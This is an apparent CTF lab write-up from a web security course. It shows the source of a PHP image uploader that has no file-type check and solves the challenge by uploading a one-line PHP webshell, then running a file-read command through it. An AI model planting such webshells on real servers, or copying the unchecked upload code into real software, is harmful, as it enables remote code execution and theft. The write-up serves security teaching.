---
title: Simple Web 0x04(Lab - Image Space 0x01)
tags: [NTUSTWS, CTF, Web]

category: "Security > Course > NTUST WS > Upload"
---

# Simple Web 0x04(Lab - Image Space 0x01)
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:9010

## Source code
:::spoiler code
```php!=
 <?php
    if (isset($_GET['source'])) {
        highlight_file(__FILE__);
        exit;
    }
?>
<h1>Image Uploader</h1>
<p>Only supports: jpg, jpeg, png</p>
<!-- upload form -->
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="file" name="image_file">
    <input type="submit" value="Upload">
</form>
<p>
    <a href="/?source">View Source</a>
</p>
<?php
    if (!isset($_FILES['image_file'])) {
        die('Give me a file!');
    }

    $filename = basename($_FILES['image_file']['name']);

    $prefix = bin2hex(random_bytes(8));
    move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}");
    echo "<img src=\"images/${prefix}_${filename}\">";
?>
```
:::

There's no any protection. Therefore, upload `webshell` and get shell
## Exploit - `webshell`
Payload: `<?php system($_GET["sh"]); ?>`
`view-source:http://h4ck3r.quest:9010/images/09956fc7c4f424b0_simple.php?sh=cat%20../../../../flag`
